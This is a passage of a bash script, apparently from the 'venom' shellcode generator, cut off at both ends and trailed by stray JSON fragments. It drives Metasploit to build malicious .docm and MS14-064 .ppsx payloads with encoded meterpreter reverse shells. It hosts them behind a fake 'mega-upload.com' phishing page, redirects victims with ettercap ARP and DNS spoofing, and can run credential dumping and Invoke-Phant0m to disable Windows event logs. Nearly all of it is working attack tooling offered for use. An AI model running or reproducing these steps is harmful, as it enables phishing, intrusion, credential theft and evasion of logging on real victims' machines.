2\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.docm\\n\\nchose how to deliver: $N4m.docm\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nif [ \"$Targ\" = \"WINDOWS\" ]; then\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\nelse\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 200) > /dev/null 2>&1\nfi\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.docm|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.docm $ApAcHe/$N4m.docm > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.docm|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.docm $ApAcHe/$N4m.docm\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n          fi\n\n\n        else\n\n\n        echo \"- ATTACK VECTOR: http://$lhost\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n             xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paa; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\"\n          fi\n        fi\n   fi\n\nsleep 2\n# CLEANING EVERYTHING UP\necho \"[☠] Cleanning temp generated files...\"\nmv $IPATH/templates/astrobaby[bk].c $IPATH/templates/astrobaby.c > /dev/nul 2>&1\nmv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1\nrm $IPATH/templates/phishing/copy.html > /dev/null 2>&1\nrm $IPATH/output/$N4m.exe > /dev/null 2>&1\nrm $ApAcHe/$N4m.docm > /dev/null 2>&1\nrm $ApAcHe/index.html > /dev/null 2>&1\nrm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\nsleep 2\nclear\ncd $IPATH/\n\nelse\n\n  echo ${RedF}[x]${white} Abort module execution ..${Reset};\n  sleep 2\n  sh_world\n  clear\nfi\n}\n\n\n\n\n# ---------------------------------------------------------------------\n# ms14_064_packager_python\n# Windows 7 SP1 with Python for Windows / Office 2010 SP2 / Office 2013\n# ---------------------------------------------------------------------\nsh_world24 () {\n# get user input to build shellcode\necho \"[☠] Enter shellcode settings!\"\nlhost=$(zenity --title=\"☠ Enter LHOST ☠\" --text \"example: $IP\" --entry --width 300) > /dev/null 2>&1\nif [ \"$?\" -eq \"0\" ]; then\nlport=$(zenity --title=\"☠ Enter LPORT ☠\" --text \"example: 666\" --entry --width 300) > /dev/null 2>&1\nN4m=$(zenity --entry --title \"☠ PAYLOAD NAME ☠\" --text \"Enter payload output name\\nexample: ms14_064\" --width 300) > /dev/null 2>&1\n\n\n## setting default values in case user have skip this ..\nif [ -z \"$lhost\" ]; then lhost=\"$IP\";fi\nif [ -z \"$lport\" ]; then lport=\"443\";fi\nif [ -z \"$N4m\" ]; then N4m=\"ms14_064\";fi\n\n# display final settings to user\ncat << !\n\n    venom settings\n    ──────────────\n    LPORT   : $lport\n    LHOST   : $lhost\n    FORMAT  : PYTHON -> WINDOWS\n    PAYLOAD : python/meterpreter/reverse_tcp\n    AGENT   : $IPATH/output/$N4m.ppsx\n\n!\n\n   # check if all dependencies needed are installed\n   # check if template exists\n   if [ -e $IPATH/templates/astrobaby.c ]; then\n      echo \"[☠] template -> found!\"\n      sleep 2\n   else\n      echo \"[☠] template -> not found!\"\n      exit\n   fi\n\n\n\n# building template\necho \"[☠] editing/backup files ..\"\nsleep 2\nif [ -e $H0m3/.msf4/local/$N4m.ppsx ]; then\nrm $H0m3/.msf4/local/$N4m.ppsx > /dev/null 2>&1\nfi\n\n\necho \"[☠] Generating binary agent ..\"\nsleep 2\n\n# use metasploit to build shellcode\necho \"[☠] Generating MS_word document ..\"\nsleep 2\nxterm -T \" SHELLCODE GENERATOR \" -geometry 110x23 -e \"msfconsole -q -x 'use exploit/windows/fileformat/ms14_064_packager_python; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set FILENAME $N4m.ppsx; set LHOST $lhost; set LPORT $lport; run; exit -y'\" > /dev/null 2>&1\nmv $H0m3/.msf4/local/$N4m.ppsx $IPATH/output/$N4m.ppsx > /dev/null 2>&1\necho \"[☠] MS_word agent: $IPATH/output/$N4m.ppsx ..\"\nsleep 2\n\n\n# CHOSE HOW TO DELIVER YOUR PAYLOAD\nserv=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"Payload stored:\\n$IPATH/output/$N4m.ppsx\\n\\nchose how to deliver: $N4m.ppsx\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"multi-handler (default)\" FALSE \"apache2 (malicious url)\" --width 305 --height 220) > /dev/null 2>&1\n\n\n   if [ \"$serv\" = \"multi-handler (default)\" ]; then\n      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n      echo \"[☠] Start a multi-handler...\"\n      echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n      echo \"[☯] Please dont test samples on virus total...\"\n        if [ \"$MsFlF\" = \"ON\" ]; then\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'\"\n          cd $IPATH/output\n          # delete utf-8/non-ancii caracters from output\n          tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n          sed -i \"s/\\[0m//g\" final.log\n          sed -i \"s/\\[1m\\[34m//g\" final.log\n          sed -i \"s/\\[4m//g\" final.log\n          sed -i \"s/\\[K//g\" final.log\n          sed -i \"s/\\[1m\\[31m//g\" final.log\n          sed -i \"s/\\[1m\\[32m//g\" final.log\n          sed -i \"s/\\[1m\\[33m//g\" final.log\n          mv final.log $N4m-$lhost.log > /dev/null 2>&1\n          rm report.log > /dev/null 2>&1\n          cd $IPATH/\n        else\n          xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; exploit'\"\n        fi\n      sleep 2\n\n\n   else\n\n\nP0=$(zenity --list --title \"☠ SHELLCODE GENERATOR ☠\" --text \"\\npost-exploitation module to run\" --radiolist --column \"Pick\" --column \"Option\" TRUE \"sysinfo.rc\" FALSE \"enum_system.rc\" FALSE \"dump_credentials.rc\" FALSE \"fast_migrate.rc\" FALSE \"stop_logfiles_creation.rc\" FALSE \"exploit_suggester.rc\" --width 305 --height 300) > /dev/null 2>&1\n\n\n  if [ \"$P0\" = \"stop_logfiles_creation.rc\" ]; then\n    #\n    # check if dependencies exist ..\n    #\n    if [ -e \"$pHanTom/post/windows/manage/Invoke-Phant0m.rb\" ]; then\n      echo \"[☠] Invoke-Phant0m.rb installed ..\"\n      sleep 2\n    else\n      echo \"[x] Invoke-Phant0m.rb not found ..\"\n      sleep 2\n      echo \"[☠] copy Invoke-Phant0m.rb to msfdb ..\"\n      sleep 2\n      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1\n      echo \"[☠] Reloading msfdb database ..\"\n      sleep 2\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfdb reinit\" > /dev/null 2>&1\n      xterm -T \"RELOADING MSF DATABASE\" -geometry 110x23 -e \"msfconsole -q -x 'db_status; reload_all; exit -y'\" > /dev/null 2>&1\n    fi\n\n      #\n      # check if Invoke-Phantom.ps1 exists ..\n      #\n      if [ -e \"$IPATH/aux/Invoke-Phant0m.ps1\" ]; then\n        echo \"[☠] Invoke-Phant0m.ps1 found ..\"\n        sleep 2\n        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1\n      else\n        echo \"[x] Invoke-Phant0m.ps1 not found ..\"\n        sleep 2\n        echo \"[☠] Please place module in $IPATH/aux folder ..\"\n        sleep 2\n        exit\n      fi\n  fi\n\n\n      # edit files nedded\n      cd $IPATH/templates/phishing\n      cp $InJEc12 mega[bak].html\n      sed \"s|NaM3|$N4m.ppsx|g\" mega.html > copy.html\n      cp copy.html $ApAcHe/index.html > /dev/null 2>&1\n      cd $IPATH/output\n      cp $N4m.ppsx $ApAcHe/$N4m.ppsx > /dev/null 2>&1\n      echo \"[☠] loading -> Apache2Server!\"\n      echo \"---\"\n      echo \"- SEND THE URL GENERATED TO TARGET HOST\"\n\n        if [ \"$D0M4IN\" = \"YES\" ]; then\n        # copy files nedded by mitm+dns_spoof module\n        sed \"s|NaM3|$N4m.ppsx|\" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html\n        cp $IPATH/output/$N4m.ppsx $ApAcHe/$N4m.ppsx\n        echo \"- ATTACK VECTOR: http://mega-upload.com\"\n        echo \"- POST EXPLOIT : $P0\"\n        echo \"---\"\n        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)\n        echo \"[☠] Start a multi-handler...\"\n        echo \"[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell\"\n        echo \"[☯] Please dont test samples on virus total...\"\n          if [ \"$MsFlF\" = \"ON\" ]; then\n            xterm -T \" PAYLOAD MULTI-HANDLER \" -geometry 110x23 -e \"sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD python/meterpreter/reverse_tcp; set StageEncoder x86/shikata_ga_nai; set EnableStageEncoding true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'\" & xterm -T \" DNS_SPOOF [redirecting traffic] \" -geometry 110x10 -e \"sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //\"\n            cd $IPATH/output\n            # delete utf-8/non-ancii caracters from output\n            tr -cd '\\11\\12\\15\\40-\\176' < report.log > final.log\n            sed -i \"s/\\[0m//g\" final.log\n            sed -i \"s/\\[1m\\[34m//g\" final.log\n            sed -i \"s/\\[4m//g\" final.log\n            sed -i \"s/\\[K//g\" final.log\n            sed -i \"s/\\[1m\\[31m//g\" final.log\n            sed -i \"s/\\[1m\\[32m//g\" final.log\n            sed -i \"s/\\[1m\\[33m//g\" final.log\n            mv final.log $N4m-$lhost.log > /dev/null 2>&1\n            rm report.log > /dev/null 2>&1\n            cd $IPATH/\n          else\n            xterm -T \" PAYLOAD MULTI-HANDLER"
        }
      ]
    }
  ]
}